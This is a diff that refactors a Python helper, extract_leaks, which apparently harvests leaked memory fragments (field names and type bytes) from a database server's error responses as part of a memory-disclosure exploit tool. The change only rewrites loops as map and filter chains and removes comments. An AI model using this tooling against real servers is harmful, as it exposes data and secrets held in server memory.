@@ -97,10 +97,8 @@ def retrieve_chunks(
     return response
 
 
-# Precompile regexes once
 _FIELD_RE = re.compile(rb"field name '([^']*)'")
 _TYPE_RE = re.compile(rb"type (\d+)")
-# Use a set for O(1) membership tests
 _IGNORED_FIELDS = {b"?", b"a", b"$db", b"ping"}
 
 
@@ -134,14 +132,18 @@ def extract_leaks(response: bytes) -> List[bytes]:
         return []
 
     leaked_fragments: List[bytes] = []
+
     # Extract field names
-    for match in _FIELD_RE.finditer(uncompressed_section):
-        field_bytes = match.group(1)
-        if field_bytes and field_bytes not in _IGNORED_FIELDS:
-            leaked_fragments.append(field_bytes)
+    fields = _FIELD_RE.finditer(uncompressed_section)
+    fields = map(lambda m: m.group(1), fields)
+    fields = filter(lambda f: f and f not in _IGNORED_FIELDS, fields)
+    leaked_fragments.extend(fields)
+
     # Extract type bytes
-    for match in _TYPE_RE.finditer(uncompressed_section):
-        leaked_fragments.append(bytes((int(match.group(1)) & 0xFF,)))
+    types = _TYPE_RE.finditer(uncompressed_section)
+    types = map(lambda m: m.group(1), types)
+    types = map(lambda t: bytes((int(t) & 0xFF,)), types)
+    leaked_fragments.extend(types)
 
     return leaked_fragments
 
